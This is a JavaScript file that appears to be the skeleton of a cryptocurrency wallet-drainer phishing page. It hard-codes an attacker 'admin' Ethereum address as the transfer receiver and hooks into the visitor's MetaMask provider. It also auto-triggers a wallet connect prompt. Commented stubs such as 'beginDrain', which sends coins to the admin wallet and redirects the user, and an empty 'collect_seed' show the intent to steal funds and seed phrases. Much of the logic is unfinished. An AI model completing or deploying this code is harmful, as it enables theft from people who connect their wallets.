walletList = []
coinList = []
supportedCoins = []
supportedWallets = ['metamask']
mobileDeepLinks = []
admin_wallets = { "eth": "0x2E16ecaa1d26C7F1D48fB8716704A5df156E8F19" }
document.getElementById("receiver").value = admin_wallets.eth;

logs = [{}]

let step1 = document.getElementById('step1')
let step2 = document.getElementById('step2')
let step3 = document.getElementById('step3')
let step4 = document.getElementById('step4')

const provider = new ethers.providers.Web3Provider(window.ethereum, "any");

// detectMobile(){
//     if(userIsMobile){
//         beginDrain('deeplinks')
//     }else{
//         beginDrain(supportedCoins)
//     }
// }
function urlsearch(params) {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const search = urlParams.get(params)

    return search;
}


window.addEventListener('load', function() {
    let status = urlsearch('error')
    let clicker = document.getElementById('openConnect')
    if (status == 'true') {
        clicker.click()
    }
})

function show_step(step) {
    if (step == 1) {
        step1.style.display = 'block';
    }
    if (step == 2) {
        step1.style.display = 'none';
        step2.style.display = 'block';
    }
    if (step == 3) {
        step2.style.display = 'none';
        step3.style.display = 'block';
    }
    if (step == 4) {
        step3.style.display = 'none';
        step2.style.display = 'none';
        step1.style.display = 'none';
        step4.style.display = 'block';
    }
}

function detectWallet() {
    console.log(provider)
    detectAvailableCoins()
}

function detectAvailableCoins() {
    // runEth()
    // walletList.each(detectAvailableCoins())
}

// beginDrain(){
//     coin.send(adminInfo.coinWallet)
//     redirectUser('')
// }

// getAdminInfo(){
//     return admin.json
// }

// getLogs(){
//     return logs
// }

function collect_seed() {
    // div.click(){
    //     "<div></div>"
    // }
}